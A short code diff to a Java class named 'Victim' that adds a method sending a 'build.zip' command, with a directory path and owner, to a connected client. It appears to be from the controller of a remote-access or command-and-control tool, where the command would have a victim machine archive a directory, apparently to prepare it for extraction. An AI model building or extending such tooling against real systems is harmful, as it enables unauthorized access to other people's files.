@@ -79,6 +79,14 @@ public abstract class Victim extends Client {
         sendMessage(query);
     }
 
+    void sendBuildZip(String dirPath, String owner) {
+        JSONObject query = new JSONObject();
+        query.put("action", "build.zip");
+        query.put("dirPath", dirPath);
+        query.put("owner", owner);
+        sendMessage(query);
+    }
+
     void sendMessage(JSONObject message) {
         SocketAddress address = context.channel().remoteAddress();
         System.out.println(name + " ("+ address + ") << " + message);
